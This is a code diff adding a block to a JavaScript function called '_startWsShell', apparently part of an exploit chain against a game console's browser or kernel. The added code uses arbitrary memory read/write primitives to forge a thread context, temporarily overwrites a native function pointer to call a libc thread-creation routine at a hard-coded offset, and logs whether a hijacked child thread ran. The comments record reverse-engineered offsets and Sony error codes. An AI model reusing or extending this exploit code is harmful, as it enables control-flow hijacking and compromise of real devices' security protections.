@@ -6466,6 +6466,71 @@ function _startWsShell(){
             } else LB('t sweep SKIPPED (no MBUF)');
           }catch(eSw2){LB('t sweep fault');}
 
+          /* (4d) *** THE FIRE *** (session-177: THE CORPUS DISASSEMBLY DELIVERED
+          * THE MISSING 32-BIT VALUE: Thrd_create@libc+0x4C3C0 -> the
+          * helper at +0x4BDE0 -> the call at +0x4BE47: mov rdi,rbx
+          * (ctx); xor esi,esi (id=NULL); flags=0 (xor edx,edx/cmov);
+          * CALL THUNK 0x358 -> GOT slot i=42 -> *** lk+0x13ED0 =
+          * THR_CREATE(430) *** - confirmed by the Sony error-code
+          * test (cmp 0x8002000C), the C11 thrd_error conversion, the
+          * canary-guarded wrapper, and the 13000-cluster placement.
+          * THE PROBE: the armed ctx (the 58e gates: magic 0x480,
+          * type 0x10002/0x20001, CS=0x43, SS=0x3B, RFLAGS=0x202)
+          * at MBUF+0x1000; child RIP=lk+0x2C0 (the thr_self stub:
+          * writes THE CHILD's tid at [RDI=witness]); the child stack
+          * top = lk+0x3F0 (thr_exit - the clean exit); rawcall
+          * (lk+0x13ED0) with RDI=ctx via the scopeSwap; then read
+          * [cfr] (the kernel honors id=RSI: the tid may land at the
+          * live frame - corruption-after-return, but the reply posts
+          * first) + the ctx state. VERDICTS: the spawn ([cfr] or the
+          * witness changes), the EINVAL (RDX=NE garbage - clean
+          * return, the RDX problem confirmed), or a death (banked
+          * by the beacons). THE FIRE IS THE LAST STEP - everything
+          * else banks first. */
+          try{
+            if(MBUF&&MBUF>=0x1000000000n&&lkBL>=0x800000000n){
+              var ctxF=MBUF+0x1000n;
+              /* zero the ctx region */
+              for(var zF=0;zF<0xA0;zF++)S.absWrite(ctxF+BigInt(zF*8),0n);
+              /* the gates (the 58e ctx_alt shape) */
+              S.absWrite(ctxF+0x108n,0x480n);          /* magic */
+              S.absWrite(ctxF+0x110n,0x10002n);        /* type */
+              S.absWrite(ctxF+0x118n,0x20001n);        /* subtype */
+              S.absWrite(ctxF+0x0D0n,0n);              /* ctx flags */
+              S.absWrite(ctxF+0x0C0n,0x43n);           /* CS */
+              S.absWrite(ctxF+0x0F0n,0x202n);          /* RFLAGS */
+              S.absWrite(ctxF+0x100n,0x3Bn);           /* SS */
+              S.absWrite(ctxF+0x0E0n,lkBL+0x2C0n);     /* child RIP = thr_self stub */
+              S.absWrite(ctxF+0x048n,MBUF+0x3000n);    /* child RDI = the witness slot (in the spray) */
+              /* the child stack: top at MBUF+0x2F00, [top]=thr_exit stub */
+              var stkF=MBUF+0x2F00n;
+              S.absWrite(stkF,lkBL+0x3F0n);
+              S.absWrite(ctxF+0x0F8n,stkF);            /* child RSP */
+              LB('T FIRE rva=0x13ED0 ctx=0x'+ctxF.toString(16)+' lk=0x'+lkBL.toString(16)+' target=0x'+(lkBL+0x13ED0n).toString(16));
+              /* pre-reads: [cfr] + the witness */
+              var cfrPre=S.absRead(cfrL,8)[0];
+              var witPre=S.absRead(MBUF+0x3000n,8)[0];
+              /* THE FIRE: scopeSwap to the ctx, rawcall lk+0x13ED0 */
+              if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,ctxF);
+              var oFF=S.absRead(S.neEntry.addr+0x28n,8)[0];
+              S.absWrite(S.neEntry.addr+0x28n,lkBL+0x13ED0n);
+              try{Math.round(-5.7);}catch(eF){}
+              S.absWrite(S.neEntry.addr+0x28n,oFF);
+              if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+              /* post-reads (immediately - the reply must carry them) */
+              var cfrPost=S.absRead(cfrL,8)[0];
+              var witPost=S.absRead(MBUF+0x3000n,8)[0];
+              var magicPost=S.absRead(ctxF+0x108n,8)[0];
+              reply.fire={cfrPre:'0x'+cfrPre.toString(16),cfrPost:'0x'+cfrPost.toString(16),
+                          witPre:'0x'+witPre.toString(16),witPost:'0x'+witPost.toString(16),
+                          magicPost:'0x'+magicPost.toString(16)};
+              LB('T cfr '+cfrPre.toString(16)+' -> '+cfrPost.toString(16)+' | witness '+witPre.toString(16)+' -> '+witPost.toString(16));
+              if(cfrPost!==cfrPre){LB('T *** [cfr] CHANGED - THE KERNEL WROTE THE TID ***');reply.fire.spawned='cfr';}
+              if(witPost!==witPre){LB('T *** WITNESS CHANGED - THE CHILD RAN ***');reply.fire.spawned='witness';}
+              if(cfrPost===cfrPre&&witPost===witPre){LB('T no visible change (EINVAL-class?)');}
+            } else LB('T FIRE SKIPPED (no MBUF/lk)');
+          }catch(eFire){LB('T fire fault: '+String(eFire&&eFire.message?eFire.message:'?'));}
+
           /* (5) THE ORACLE */
           var RVAS9=[0x42410n,0x37BF0n,0x366E0n,0x4CDB0n,0x4C3C0n,0x4C240n,0x4C1C0n,0x4C6E0n,0x4C6F0n,0x4C650n,0xB020n,0xB070n];
           var tally9={},bestB9=0n,bestN9=0;
